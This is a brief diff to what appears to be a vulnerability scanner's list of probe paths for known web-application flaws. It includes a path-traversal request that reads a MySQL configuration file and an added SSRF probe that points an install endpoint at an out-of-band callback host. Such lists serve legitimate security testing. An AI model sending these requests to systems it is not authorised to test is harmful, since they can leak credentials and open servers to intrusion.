@@ -10,3 +10,4 @@
 /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
 /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
 /UserSelect/
+/install/installOperate.do?svrurl=http://{{interactsh-url}}
